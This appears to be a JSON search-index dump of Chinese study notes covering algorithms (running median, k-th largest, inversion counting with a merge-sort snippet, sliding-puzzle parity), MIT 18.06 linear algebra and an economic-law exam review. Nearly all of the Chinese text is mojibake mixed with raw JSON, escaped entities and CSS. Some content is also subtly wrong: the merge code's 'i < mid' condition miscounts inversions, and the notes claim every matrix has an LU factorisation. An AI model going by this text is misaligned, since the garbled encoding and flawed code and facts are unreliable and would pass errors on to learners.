èƒŒæ™¯ï¼šä¾æ¬¡è¾“å…¥ä¸€ä¸ªæ•´æ•°åºåˆ—ï¼Œæ¯å½“å·²ç»è¯»å…¥çš„æ¯å½“å·²ç»è¯»å…¥çš„æ•´æ•°ä¸ªæ•°ä¸ºå¥‡æ•°æ—¶ï¼Œè¾“å‡ºå·²ç»è¯»å…¥çš„è¯ä¹¦æ„æˆçš„åºåˆ—çš„ä¸­ä½æ•°ï¼› è§£å†³æ–¹æ¡ˆï¼šå¯ä»¥å»ºç«‹ä¸¤ä¸ªäºŒå‰å †ï¼šä¸€ä¸ªå¤§æ ¹å¯¹ï¼ˆ1~M/2 ä¸ªå…ƒç´ ï¼‰ã€ä¸€ä¸ªå°æ ¹å †ï¼ˆM/2 + 1~M ä¸ªå…ƒç´ ï¼‰ï¼›  ç¬¬ k å¤§æ•°ï¼š\n èƒŒæ™¯ï¼šç»™å®š n ä¸ªæ•´æ•°ï¼Œå¦‚ä½•æ±‚å‡ºç¬¬ k å¤§çš„æ•°ï¼› è§£å†³æ–¹æ¡ˆï¼šç±»ä¼¼å¿«æ’çš„æ€æƒ³ï¼Œé€‰å‡ºä¸€ä¸ª pivotï¼Œæ¯æ¬¡æ’åºåä¸ k è¿›è¡Œæ¯”è¾ƒï¼Œåªéœ€è¦åœ¨ä¸€ä¾§ç»§ç»­é€’å½’æŸ¥æ‰¾ï¼›æ—¶é—´å¤æ‚åº¦ $$O(n) + O(n/2) + \\cdots + 1 = O(n)$$ï¼›  æ±‚é€†åºå¯¹ï¼š\n èƒŒæ™¯ï¼šå¯¹äºä¸€ä¸ªåºåˆ— aï¼Œå¦‚æœå­˜åœ¨ i\u0026gt;j, a[i]\u0026lt;a[j]ï¼Œåˆ™å®ƒä»¬ç§°ä½œä¸€å¯¹é€†åºå¯¹ã€‚æ±‚ä¸€ä¸ªç»™å®šåºåˆ—ä¸­é€†åºå¯¹æ•°é‡ï¼› è§£å†³æ–¹æ¡ˆï¼šé€†åºå¯¹å¯ä»¥é€šè¿‡åœ¨å½’å¹¶æ’åºçš„è¿‡ç¨‹ä¸­è®¡ç®—ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ•°çŠ¶æ•°ç»„è®¡ç®—ã€‚ä»¥ä¸‹æ˜¯å½’å¹¶çš„è§£æ³•ï¼š  void merge(int l, int mid, int r) { \tint i = l, j = mid + 1;  for (int k = l; k \u0026lt;= r; k++) {  if (j \u0026gt; r || i \u0026lt; mid \u0026amp;\u0026amp; a[i] \u0026lt; a[j]) b[k] = a[i++];  else b[k] = a[j++], rcnt += mid - i + 1;  }  for (int k = l; k \u0026lt;= r; k++) a[k] = b[k]; } å¥‡æ•°ç é—®é¢˜ï¼ˆæ‹¼å›¾é—®é¢˜ï¼‰ï¼š\n èƒŒæ™¯ï¼š  åœ¨ä¸€ä¸ª n*n çš„ç½‘æ ¼ä¸­è¿›è¡Œï¼Œå…¶ä¸­ n ä¸ºå¥‡æ•°ï¼Œ1 ä¸ªç©ºæ ¼å’Œ 1~(n-1)*n ä¸ªæ•°å­—ï¼Œå®ƒä»¬æ°å¥½ä¸é‡ä¸æ¼åœ°åˆ†å¸ƒåœ¨ n*n çš„ç½‘æ ¼ä¸­ï¼Œç©ºæ ¼ç§»åŠ¨çš„è§„åˆ™å’Œæ‹¼å›¾ç±»ä¼¼ã€‚ ç°åœ¨ç»™å®šä¸¤ä¸ªå¥‡æ•°ç æ¸¸æˆçš„å±€é¢ Aã€Bï¼Œè¯·åˆ¤æ–­ A æ˜¯å¦èƒ½é€šè¿‡ç§»åŠ¨å¾—åˆ°å±€é¢ Bï¼›   è§£å†³æ–¹æ¡ˆï¼šä¸Šè¿°å‘½é¢˜åªéœ€è¦è€ƒè™‘ä¸€ä¸ªå……åˆ†å¿…è¦æ¡ä»¶ï¼š  å¦‚æœæŒ‰é¡ºåºå°†ç½‘æ ¼å±•å¼€åºåˆ—ï¼ŒAB ä¸¤ä¸ªå±€é¢çš„é€†åºå¯¹å¥‡å¶æ€§ç›¸åŒï¼›    å€å¢ #  "},{"id":363,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/1.%E6%96%B9%E7%A8%8B%E7%BB%84%E7%9A%84%E5%87%A0%E4%BD%95%E8%A7%A3/","title":"1.æ–¹ç¨‹ç»„çš„å‡ ä½•è§£","section":"çº¿æ€§ä»£æ•°-MIT18.06","content":"1. æ–¹ç¨‹ç»„çš„å‡ ä½•è§£ #  Linear equations can be written as $$A \\times X = B$$\nFind linear combination of columns (x\u0026rsquo;s coefficient vector, and y\u0026rsquo;s ciefficient vector);\nä»»ä½•ä¸€ä¸ªçº¿æ€§æ–¹ç¨‹å¯ä»¥ä»ä¸¤ä¸ªè§†è§’äº†è§£å®ƒï¼š\n Row Pictureï¼šå°†æ¯å•ä¸ªæ–¹ç¨‹è§†ä½œä¸ºç©ºé—´ä¸­çš„æŸä¸ªç‚¹é›†ï¼Œæ±‚æ–¹ç¨‹çš„è§£å³ä½æ±‚ç‚¹é›†çš„äº¤ç‚¹ï¼› Column Pictureï¼šå°†æ¯ä¸ªæœªçŸ¥å…ƒåœ¨å„ä¸ªæ–¹ç¨‹ä¸­çš„ç³»æ•°ï¼Œè§†ä½œä¸€ä¸ªå‘\u0010é‡ï¼Œæ±‚æ–¹ç¨‹çš„è§£å³æ±‚è¿™äº›å‘é‡çš„çº¿æ€§ç»„åˆï¼›  åœ¨ç”¨æœªçŸ¥æ•°ç³»æ•°å‘é‡çš„æ€ç»´è§£å†³é—®é¢˜æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæ€è€ƒä»¥ä¸‹é—®é¢˜ï¼š\n æœ‰æ²¡æœ‰ä¸€ç§é€šç”¨çš„æ–¹æ³•èƒ½å¤Ÿå¾—åˆ°æ–¹ç¨‹çš„è§£ï¼Ÿ æœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•èƒ½å¤Ÿåˆ¤æ–­æ–¹ç¨‹ç»„çš„æ¡ä»¶æ˜¯å¦è¶³å¤Ÿï¼Œå³åŸæ–¹ç¨‹æ˜¯å¦æœ‰è§£ï¼Ÿ  çŸ©é˜µä¹˜æ³•çš„ç†è§£æ–¹å¼æœ‰ä¸¤ç§ï¼š\n é€šä¿—çš„ç‚¹ä¹˜ç†è§£ï¼› çŸ©é˜µçš„æ¯ä¸ªåˆ—éƒ½æ˜¯ä¸€ä¸ªå‘é‡ï¼ŒçŸ©é˜µä¹˜ä»¥ä¸€ä¸ªå‘é‡ï¼Œå¯ä»¥ç†è§£ä¸ºçŸ©é˜µçš„åˆ—å‘é‡çš„çº¿æ€§ç»„åˆã€‚  "},{"id":364,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/2.%E7%9F%A9%E9%98%B5%E6%B6%88%E5%85%83%E6%B3%95/","title":"2.çŸ©é˜µæ¶ˆå…ƒæ³•","section":"çº¿æ€§ä»£æ•°-MIT18.06","content":"2. çŸ©é˜µæ¶ˆå…ƒæ³• #  çŸ©é˜µæ¶ˆå…ƒæ³•ä¸è¡Œåˆ—å¼ä¸€æ ·éƒ½æ˜¯å¯ä»¥ç”¨äºè§£å†³æ–¹ç¨‹ç»„çš„æ–¹å¼ã€‚\nçŸ©é˜µæ¶ˆå…ƒæ³•çš„æ­¥éª¤å¦‚ä¸‹ï¼š\n è€ƒè™‘ç³»æ•°çŸ©é˜µï¼ŒæŒ‰è¡Œè‡ªä¸Šè€Œä¸‹é€šè¿‡ä¸ä¹‹å‰è¡Œçš„åŠ å‡æ³•è¿ç®—ï¼Œå°† pivotï¼ˆå¯¹è§’çº¿ä¸Šçš„å…ƒç´ ï¼‰å·¦ä¾§çš„æ‰€æœ‰å…ƒç´ è¿ç®—ä¸º 0ï¼›è¿ç®—ç»“æŸåå¯ä»¥å¾—åˆ°ä¸€ä¸ªä¸Šä¸‰è§’çŸ©é˜µï¼Œè®°ä¸º Uï¼› å¯¹å³ä¾§å‘é‡åšç›¸åŒçš„è¿ç®—ï¼ŒæŒ‰è¡Œè‡ªä¸‹è€Œä¸Šå›å¸¦è®¡ç®—å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„æœªçŸ¥æ•°ï¼›  æ¦‚å¿µå¢å¹¿çŸ©é˜µï¼ˆaugmented matrixï¼‰ï¼šè€ƒè™‘æ‰€æœ‰ç³»æ•°å’Œç»“æœå‘é‡çš„ä¸€ä¸ªå¤§çŸ©é˜µï¼›\nSimple operation of matrix:\n Matrix * Vector: Result in a column, linear combination of the columns of the matrix; Vector * Matrix: Result in a row, linear combination of the rows of the matrix;  çŸ©é˜µæ¶ˆå…ƒæ³•ä¸­çš„æ­¥éª¤ï¼Œè¡Œä¹‹é—´çš„â€œåŠ å‡æ³•è¿ç®—â€å°±å¯ä»¥ç”¨çŸ©é˜µä¹˜æ³•è¡¨ç¤ºã€‚æ¯”å¦‚æŸä¸€ä¸ªæ“ä½œâ€œå°†ç¬¬äºŒè¡Œå‡å»ç¬¬ä¸€è¡Œçš„ 3 å€â€ï¼Œè¿™ä¸€æ“ä½œå°±å¯ä»¥ç”¨è¿™æ ·ä¸€ä¸ªçŸ©é˜µè¡¨ç¤ºï¼š$$\\pmatrix{1 \u0026amp;0 \u0026amp;0 \\ -3 \u0026amp;1 \u0026amp;0 \\ 0 \u0026amp;0 \u0026amp;1}$$ï¼Œå®ƒçš„å«ä¹‰ä¸ºï¼š\n ç¬¬ä¸€è¡Œä¿æŒä¸å˜ï¼Œå³çº¿æ€§ç»„åˆ $$ 1 * row_1 + 0 * row_2 + 0 * row_3 $$ï¼› ç¬¬äºŒè¡Œå‡å»ç¬¬ä¸€è¡Œçš„ä¸‰å€ï¼Œå³çº¿æ€§ç»„åˆ $$-3 * row_1 + 1 * row_2 * 0 * row_3$$ï¼› ç¬¬ä¸‰è¡Œä¿æŒä¸å˜ï¼Œå³çº¿æ€§ç»„åˆ $$0 * row_1 + 0 * row_2 + 1 * row_3$$  çŸ©é˜µä¹˜æ³•è¿ç®—çš„é‡è¦æ€§è´¨ï¼šä¸æ»¡è¶³äº¤æ¢å¾‹ã€æ»¡è¶³ç»“åˆå¾‹ï¼›\nIdentity Matrixï¼šå•ä½çŸ©é˜µï¼›\nPermutation Matrixï¼šä¹˜ä»¥ä¸€ä¸ªçŸ©é˜µä¹‹åèƒ½å¾—åˆ°è¿™ä¸ªçŸ©é˜µè¡Œæˆ–åˆ—çš„æ’åˆ—ï¼›\n"},{"id":365,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/3.%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E5%92%8C%E9%80%86/","title":"3.çŸ©é˜µä¹˜æ³•å’Œé€†","section":"çº¿æ€§ä»£æ•°-MIT18.06","content":"3. çŸ©é˜µä¹˜æ³•å’Œé€† #  ä¹˜æ³• #  çŸ©é˜µä¹˜æ³•çš„è§„åˆ™ï¼Œå¯¹äºè¿ç®— $$A * B = C$$ï¼š\n  C ä¸­çš„å…ƒç´ å€¼ $$C_{ij} = \\sum_{k = 1}^n A_{ik} * B_{kj}$$ï¼›\n  ä¹˜æ³•å¯ä»¥è¿ç®—çš„å‰ææ¡ä»¶ï¼šA çš„åˆ—æ•°ç­‰äº B çš„è¡Œæ•°ï¼›\n  å…¶ä»–ç†è§£çŸ©é˜µä¹˜æ³•çš„æ–¹å¼ï¼š\n C ä¸­çš„ä»»æ„ä¸€è¡Œï¼šB çš„æ‰€æœ‰è¡Œçš„çº¿æ€§ç»„åˆï¼› C ä¸­çš„ä»»æ„ä¸€åˆ—ï¼šA çš„æ‰€æœ‰åˆ—çš„çº¿æ€§ç»„åˆï¼› C æ˜¯ï¼šâ€œA çš„æ‰€æœ‰åˆ—ä¸B çš„æ‰€æœ‰è¡Œçš„ä¹˜ç§¯â€çš„å’Œï¼›  åˆ†å—ä¹˜æ³•ï¼š$$\\pmatrix{A_1 \u0026amp;A_2 \\ A_3 \u0026amp;A_4} * \\pmatrix{ B_1 \u0026amp;B_2 \\ B_3 \u0026amp;B_4 } = \\pmatrix{A_1B_1 + A_2B_3 \u0026amp;A_1B_2 + A_2B_4 \\ A_3B_1 + A_4B_3 \u0026amp;A_3B_2 + A_4B_4}$$\nçŸ©é˜µçš„é€† #  ä»€ä¹ˆæ˜¯çŸ©é˜µçš„é€†ï¼š\n å¯¹äºä¸€ä¸ªçŸ©é˜µ Aï¼Œå®ƒçš„é€†ä¸º $$A^{-1} A = I$$  ä¸€ä¸ªä¸æ˜¯ç‰¹åˆ«å®¹æ˜“è¯æ˜çš„æ€§è´¨ï¼šå¯¹äºä¸€ä¸ªæ–¹å‹çŸ©é˜µï¼Œå®ƒçš„å·¦é€†æ€»æ˜¯ç­‰äºå³é€†ï¼›\nå¦‚æœä¸€ä¸ªçŸ©é˜µçš„é€†å­˜åœ¨ï¼Œé‚£ä¹ˆè¿™ä¸ªçŸ©é˜µè¢«ç§°ä¸ºå¯é€†çš„ï¼ˆinvertibleï¼‰ã€éå¥‡å¼‚çš„ï¼ˆnon-singularï¼‰ï¼›\næ²¡æœ‰é€†çš„çŸ©é˜µï¼Œæˆ–è€…å¥‡å¼‚çŸ©é˜µï¼š\n å¦‚æœè€ƒè™‘è¿™ä¸ªçŸ©é˜µçš„è¡Œåˆ—å¼ï¼Œä¼šå‘ç°å®ƒçš„å€¼ä¸º 0ï¼› çŸ©é˜µä¸­çš„åˆ—é€šè¿‡ä»»ä½•æ–¹å¼çš„çº¿æ€§ç»„åˆï¼Œä¸å¯èƒ½å¾—åˆ°å•ä½çŸ©é˜µä¸­çš„åˆ—ï¼›ä½†æ˜¯å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªçº¿æ€§ç»„åˆä½¿å…¶ä¸º 0 å‘é‡ï¼Œä¹Ÿå°±æ˜¯è¯´å­˜åœ¨è¿™æ ·çš„ X ä½¿å¾— $$A X = 0$$  Gauss-Jordan æ–¹æ³•æ±‚ä¸€ä¸ªçŸ©é˜µçš„é€†ï¼š\n è€ƒè™‘å¢å¹¿çŸ©é˜µ $$\\pmatrix{A \u0026amp;I}$$ï¼Œç»è¿‡è¡Œå˜æ¢å¾—åˆ° $$\\pmatrix{I \u0026amp;A^{-1}}$$ï¼› è¯æ˜å¾ˆç®€å•ï¼šè¡Œå˜åŒ–å¯ä»¥è§†ä½œå·¦ä¹˜è‹¥å¹²ä¸ªçŸ©é˜µï¼Œåˆ©ç”¨ç»“åˆå¾‹å°†å…¶è§†ä½œä¸º Eï¼Œåˆ™ $$E \\pmatrix{A \u0026amp;I} = \\pmatrix{EA \u0026amp;E}$$  "},{"id":366,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/4.%E7%9F%A9%E9%98%B5%E7%9A%84lu%E5%88%86%E8%A7%A3/","title":"4.çŸ©é˜µçš„ Luåˆ†è§£","section":"çº¿æ€§ä»£æ•°-MIT18.06","content":"çŸ©é˜µçš„LUåˆ†è§£ #  AB çš„é€†ï¼š$$B^{-1} A^{-1}$$\nè½¬ç½®çš„é€†ï¼Œ$$A^T$$ çš„é€†æ˜¯ $$(A^{-1})^T$$\nçŸ©é˜µçš„ LU åˆ†è§£ï¼š\n ä»»æ„ä¸€ä¸ªçŸ©é˜µ A è¡¨ç¤ºä¸€å®šå¯ä»¥è¡¨ç¤ºä¸ºä¸¤ä¸ªçŸ©é˜µ Lã€U çš„ä¹˜ç§¯ï¼Œå…¶ä¸­ L æ˜¯ä¸€ä¸ªä¸‹ä¸‰è§’çŸ©é˜µã€ U æ˜¯ä¸€ä¸ªä¸Šä¸‰è§’çŸ©é˜µï¼›  æ¶ˆå…ƒæ³•ä¸­ï¼Œå·²ç»çŸ¥é“ï¼š\n  çŸ©é˜µ A å¯ä»¥é€šè¿‡å·¦ä¹˜è‹¥å¹²ä¸ªè¡Œå˜åŒ–æ“ä½œçŸ©é˜µï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªä¸Šä¸‰è§’çŸ©é˜µï¼Œå³ $$E_{n(n-1)}\\cdots E_{21}A = U$$ï¼›\n  ç”±ä¸Šé¢çš„å…¬å¼å¯ä»¥å¾—åˆ°ï¼š$$L = E_{21}^{-1} \\cdots E_{n(n-1)}^{-1}$$ï¼Œæ˜¯ä¸€ä¸ªä¸‹ä¸‰è§’çŸ©é˜µï¼›\n  å¯¹äºæ¯ä¸€ä¸ªè¡Œæ“ä½œçš„é€†ä¹Ÿæ˜¯å¾ˆå¥½æ±‚çš„ï¼Œå®ƒçš„å¯¹è§’çº¿æ˜¯ 1ï¼Œä¸€ä¸ªä½ç½®æœ‰æ“ä½œæ•° xï¼Œå…¶ä»–ä½ç½®éƒ½æ˜¯ 0ï¼Œå®ƒçš„é€†å°±æ˜¯å°†å¯¹åº”ä½ç½®çš„æ“ä½œæ•°æ”¹å†™æˆ -x å³å¯ï¼›\n  è¿™ä¸ªæ–¹æ³•éœ€è¦çš„æ—¶é—´å¤æ‚åº¦æ˜¯ $$O(n^2 \\cdot n)$$\n  Permutation Matrix:\n For matrix size $$n \\times n$$, there are $$n!$$ different permutation matrices; Mutiplation of two permutation matrix will result in a permutation matrix; Inverse of permutaion matrix: $$P^{-1} = P^{T}$$  ä¸Šé¢çš„ A=LU å…¬å¼åˆ†è§£ä¸­å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼š\n æ¶ˆå…ƒæ³•é™¤äº†å·¦ä¹˜è¡Œçš„çº¿æ€§ç»„åˆä¹‹å¤–ï¼Œè¿˜ä¼šè¿›è¡Œè¡Œç½®æ¢ï¼Œä¹Ÿå°±æ˜¯å·¦ä¹˜ä¸€ä¸ªæ’åˆ—çŸ©é˜µï¼ˆPermutation Matrixï¼‰ è®¾è¿™ä¸ªè¡Œç½®æ¢çŸ©é˜µä¸º Pï¼Œé‚£ä¹ˆåˆ†è§£å¯ä»¥è¡¨ç¤ºä¸º $$PA = LU$$  "},{"id":367,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/5.%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BD%AC%E7%BD%AE/","title":"5.çŸ©é˜µçš„è½¬ç½®","section":"çº¿æ€§ä»£æ•°-MIT18.06","content":"çŸ©é˜µçš„è½¬ç½® #  ä»€ä¹ˆæ˜¯è½¬ç½®ï¼ˆTransposeï¼‰ï¼š\n å¯¹äº A çš„è½¬ç½®çŸ©é˜µ $$A^T$$ï¼Œå…¶ä¸­çš„å…ƒç´ æ»¡è¶³ $$(A^T){ij} = A{ji}$$  å¯¹ç§°çŸ©é˜µï¼ˆSymmetric Matrixï¼‰ï¼šæ»¡è¶³ $$A^T = A$$ æ¡ä»¶çš„çŸ©é˜µ\næœ‰è¶£çš„æ€§è´¨ï¼š\n çŸ©é˜µå’Œä»–è½¬ç½®çš„ç§¯æ˜¯å¯¹ç§°çŸ©é˜µï¼Œå³ $$(AA^T)^T = AA^T$$ã€‚   "},{"id":368,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BB%8F%E6%B5%8E%E6%B3%95/%E7%BB%8F%E6%B5%8E%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"ç»æµæ³•æœŸæœ«å¤ä¹ ","section":"ç»æµæ³•","content":"ç»æµæ³•æœŸæœ«å¤ä¹  #  .define { color:red; font-weight:bold; }\r.quote { color:blue; font-weight:bold; }\r.question { color:orange; font-weight:bold; }\r.answer { color:SlateGrey; font-weight:bold; }\r.ps {color:grey; opacity:0.6; font-weight:normal; }\r\rç¬¬ä¸€ç«  ç»æµæ³•æ¦‚å¿µ #  ç¬¬2èŠ‚ ç»æµæ³•è°ƒæ•´å¯¹è±¡ #   æˆ‘å›½ç»æµæ³•ç‰¹ç‚¹ï¼š(1)ä¸æˆç†Ÿ; (2)ç¼ºä¹å‰ç»æ€§; (3)è¡¨ç°ä¸ºä¸ç¨³å®šæ€§ã€‚ 1992å¹´ç¤¾ä¼šä¸»ä¹‰å¸‚åœºç»æµå¸‚åœºç»æµä½“åˆ¶çš„ç¡®å®šä¸ºä¸­å›½ç»æµæ³•å­¦çš„å‘å±•æä¾›äº†æ˜ç¡®çš„å‘å±•æ–¹å‘ æˆ‘å›½ç»æµæ³•è°ƒæ•´å¯¹è±¡çš„ä¸åŒå­¦è¯´ï¼š  ç»æµåè°ƒå­¦è¯´ï¼šç»æµæ³•æ˜¯åè°ƒç»æµè¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿçš„ç»æµå…³ç³»çš„æ³•å¾‹è§„èŒƒçš„æ€»ç§°ã€‚ å¹²é¢„ç»æµå…³ç³»æ³•ï¼šå›½å®¶ä¸ºäº†å…‹æœå¸‚åœºç»æµè°ƒèŠ‚çš„ç›²ç›®æ€§å’Œå±€é™æ€§ï¼Œè€Œåˆ¶å®šçš„è°ƒæ•´ éœ€è¦ç”±å›½å®¶å¹²é¢„çš„å…·æœ‰å…¨å±€æ€§å’Œç¤¾ä¼šå…¬å…±æ€§çš„ç»æµå…³ç³» çš„æ³•å¾‹è§„èŒƒçš„æ€»ç§°ã€‚ å›½å®¶è°ƒèŠ‚å…³ç³»è¯´ï¼šç°ä»£ç»æµæ³•æ˜¯é€‚åº”ç°ä»£å¸‚åœºç»æµå›½å®¶è°ƒèŠ‚ç¤¾ä¼šç»æµçš„éœ€è¦è€Œäº§ç”Ÿå¹¶å½¢æˆç‹¬ç«‹çš„æ³•å¾‹éƒ¨é—¨ï¼Œå®ƒæ˜¯å›½å®¶è°ƒèŠ‚å³â€œå›½å®¶ä¹‹æ‰‹â€æœ‰æ•ˆè¿ä½œçš„ä¸»è¦æ³•å¾‹ä¿éšœ  å›½å®¶è°ƒèŠ‚ç»æµè¿ç”¨çš„ä¸‰ç§åŸºæœ¬æ–¹å¼ï¼šï¼ˆ1ï¼‰å¼ºåˆ¶ï¼›ï¼ˆ2ï¼‰å‚ä¸ï¼›ï¼ˆ3ï¼‰ä¿ƒå¯¼   ç»æµç®¡ç†å…³ç³»è¯´ï¼šç»æµæ³•æ˜¯è°ƒæ•´å‘ç”Ÿåœ¨æ”¿åºœã€æ”¿åºœç»æµç®¡ç†æœºå…³å’Œç»æµç»„ç»‡ã€å…¬æ°‘ä¸ªäººä¹‹é—´ä»¥ç¤¾ä¼šå…¬å…±æ€§ä¸ºæ ¹æœ¬ç‰¹å¾çš„ç»æµç®¡ç†å…³ç³»çš„æ³•å¾‹è§„èŒƒçš„ç»¼åˆã€‚    ç¬¬3èŠ‚ ç»æµæ³•çš„æ¦‚å¿µ #   ç»æµæ³•ï¼šç»æµæ³•æ˜¯ä¸ºäº†ç»´æŠ¤å›½æ°‘ç»æµæŒç»­ã€å¥åº·å‘å±•ï¼Œæ”¿åºœä¾æ³•ç»„ç»‡ã€è°ƒèŠ‚ã€ç›‘ç£ç¤¾ä¼šç»æµè¿è¡Œçš„æ³•å¾‹åˆ¶åº¦çš„æ€»ç§°  ç›®çš„ä¸»ä½“æ‰‹æ®µå¯¹è±¡ç»´æŠ¤å›½æ°‘ç»æµæŒç»­å¥åº·å‘å±•æ”¿åºœç»„ç»‡ã€è°ƒèŠ‚ã€ç›‘ç£ç¤¾ä¼šç»æµè¿è¡Œ\r.row2of1_3 th { font-weight:normal }\r\r- ç†è§£ç»æµæ³•ï¼Œåº”å½“æ³¨æ„ä»¥ä¸‹çš„å‡ ä¸ªé—®é¢˜ï¼š\r1. ç»æµæ³•ä¸ç»æµæ³•å¾‹æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µã€‚ä»å¹¿ä¹‰ä¸Šè®²ï¼Œæ‰€æœ‰è°ƒèŠ‚ç»æµæ´»åŠ¨çš„è§„åˆ™éƒ½å¯ä»¥ç§°ä¹‹ä¸ºç»æµæ³•å¾‹ï¼›ä½†æ˜¯ç»æµæ³•å´æ˜¯å…·æœ‰ç‰¹å®šå«ä¹‰çš„ç»æµæ³•å¾‹åˆ¶åº¦ï¼Œæ›´å¤šä½“ç°äº†å›½æ°‘ç»æµå®è§‚è¿è¡Œçš„è¦æ±‚ï¼Œå…¶ç«‹æ³•å®—æ—¨åˆ™ä»¥å›½æ°‘ç»æµçš„æŒç»­ã€å¥åº·å‘å±•ä¸ºå…¶æ ¸å¿ƒä»·å€¼ç›®æ ‡ã€‚\r2. ç»´æŠ¤å›½æ°‘ç»æµæŒç»­ã€å¥åº·å‘å±•æ˜¯ç»æµæ³•çš„å†å²ä½¿å‘½ã€‚\r3. æ”¿åºœæ˜¯ç»æµæ³•çš„é‡è¦ä¸»ä½“ã€‚æ”¿åºœä¸ä»…è¦ç›‘ç£å…¶ä»–å¸‚åœºä¸»ä½“çš„ç»æµæ´»åŠ¨ï¼Œæ—¢è¦è¿è¥å›½æœ‰èµ„äº§æˆ–ç›´æ¥è¿›è¡Œç”Ÿäº§ç»è¥ï¼Œä¹Ÿè¦å¯¹å›½åç»æµè¿è¡Œè¿›è¡Œå®è§‚è°ƒæ§ã€‚\r- æ­¤å¤–ï¼Œä¸­ä»‹ç»„ç»‡åŒ…æ‹¬è¡Œä¸šåä¼šä½œä¸ºå¸‚åœºä¸»ä½“ï¼ŒåŠŸèƒ½ä»‹äºæ”¿åºœä¼ä¸šä¹‹é—´ï¼Œä¹Ÿæ˜¯æ°‘æ³•è¡Œæ”¿æ³•ä¸»ä½“å†…æ¶µéš¾ä»¥å…¨é¢è¦†ç›–çš„ã€‚\r4. å…³äºç»æµæ³•æ¦‚å¿µçš„è§‚ç‚¹è§ä»è§æ™ºã€‚\rç¬¬äºŒç«  ç»æµæ³•ä½“ç³» #  ç¬¬3èŠ‚ ç»æµæ³•ä½“ç³»çš„æ„æˆ #   åŸºæœ¬æ„æˆï¼šç»æµæ³•ä½“ç³»åŒ…æ‹¬ä¸¤ä¸ªäºšä½“ç³»ï¼š  ä¸€æ˜¯ä¸ºäº†ä¿æŠ¤å¸‚åœºè‡ªå‘è°ƒèŠ‚æœºåˆ¶ï¼Œé˜²æ­¢å¸‚åœºå¤±çµçš„å¸‚åœºè§„åˆ¶çš„æ³•å¾‹åˆ¶åº¦ äºŒæ˜¯ç¡®è®¤å’Œè§„èŒƒæ”¿åºœå®è§‚è°ƒæ§ç»æµè¿è¡Œè¡Œä¸ºçš„å®è§‚è°ƒæ§æ³•å¾‹åˆ¶åº¦   ç»æµæ³•ä½“ç³»çš„å†…éƒ¨å…³ç³»ï¼š  äºŒè€…äº§ç”Ÿçš„å…ˆåé¡ºåºä¸åŒã€‚å…ˆæœ‰å¾®è§‚ç»æµè¿è¡Œâ†’å‘è¾¾æ··ä¹±â†’å¼ºåŠ¿ä»‹å…¥â†’å®è§‚è°ƒæ§ äºŒè€…è§£å†³çš„é—®é¢˜ä¸åŒã€‚  å¸‚åœºè§„åˆ¶æ³•å¾‹åˆ¶åº¦æ‰€è¦è§£å†³çš„é—®é¢˜æ˜¯ï¼Œæ’é™¤å¹²æ‰°è‡ªç”±ç«äº‰çš„å› ç´ ï¼Œä¿è¯å¸‚åœºè‡ªå‘è°ƒèŠ‚æœºåˆ¶æ­£å¸¸è¿è¡Œï¼Œé˜²æ­¢å‡ºç°å¸‚åœºå¤±çµï¼› å®è§‚è°ƒæ§æ³•å¾‹åˆ¶åº¦æ˜¯ç¡®è®¤å’Œè§„èŒƒæ”¿åºœå®è§‚è°ƒæ§ç»æµè¿è¡Œè¡Œä¸ºï¼Œé€‚åº¦å¹²é¢„ç»æµçš„æ³•å¾‹å½¢å¼ã€‚   äºŒè€…å…·ä½“æ„æˆä¸åŒã€‚  å¸‚åœºè§„åˆ¶æ³•å¾‹åˆ¶åº¦ä¸»è¦ç”±ä»¥ä¸‹å†…å®¹ç»„æˆï¼šç«äº‰æ³•ã€æ¶ˆè´¹è€…æƒç›Šä¿æŠ¤æ³•ã€äº§å“è´¨é‡æ³•ã€é£Ÿå“å®‰å…¨æ³•ã€è¯åˆ¸æ³•ç­‰ï¼› å®è§‚è°ƒæ§æ³•ä¸»è¦ç”±ä»¥ä¸‹å†…å®¹æ„æˆï¼šè´¢æ”¿æ³•ã€æ”¿åºœé‡‡è´­æ³•ã€ç¨æ³•ã€ä¸­å¤®é“¶è¡Œæ³•ã€ä¿¡è´·è°ƒæ§æ³•ã€ä»·æ ¼æ³•ã€å¯¹å¤–è´¸æ˜“æ³•ç­‰ã€‚      ç¬¬ä¸‰ç«  ç»æµæ³•åœ°ä½ #  ç¬¬3èŠ‚ ç»æµæ³•ä¸å…¶ä»–æ³•å¾‹éƒ¨é—¨çš„å…³ç³» #   ç»æµæ³•ä¸æ°‘æ³•  æ°‘æ³•æ˜¯æœ€å…¸å‹çš„ç§æ³•ï¼Œå¼ºè°ƒä¸ªä½“åˆ©ç›Šï¼Œå°Šé‡å½“äº‹äººçš„æ„æ€è‡ªæ²»ï¼Œå´‡å°šå¥‘çº¦è‡ªç”±ã€‚ 